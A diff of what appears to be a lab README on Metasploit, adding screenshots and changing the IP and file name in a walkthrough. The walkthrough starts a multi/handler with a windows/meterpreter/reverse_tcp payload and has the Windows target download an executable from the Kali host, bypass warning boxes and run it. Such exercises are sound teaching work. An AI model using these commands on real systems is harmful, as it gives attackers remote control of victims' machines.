@@ -90,17 +90,24 @@ Check the status of apache2 ```sudo apache2 status```
 
 
 Invoke msfconsole:
+<img width="871" height="617" alt="image" src="https://github.com/user-attachments/assets/1e1b992c-893a-41d2-bdcf-98902b7eddef" />
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
+<img width="746" height="612" alt="image" src="https://github.com/user-attachments/assets/d2156186-6916-4cbd-bd41-c7ee430f3dc9" />
 
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
+<img width="955" height="707" alt="image" src="https://github.com/user-attachments/assets/02efea2a-2bb8-42e5-980c-2b52b34fdbf1" />
+
 
 ### Output 
 
 
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/divya.exe``` The file "divya.exe" downloads.
 
-<img width="871" height="617" alt="image" src="https://github.com/user-attachments/assets/1e1b992c-893a-41d2-bdcf-98902b7eddef" />
+### Output 
+
+
+
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
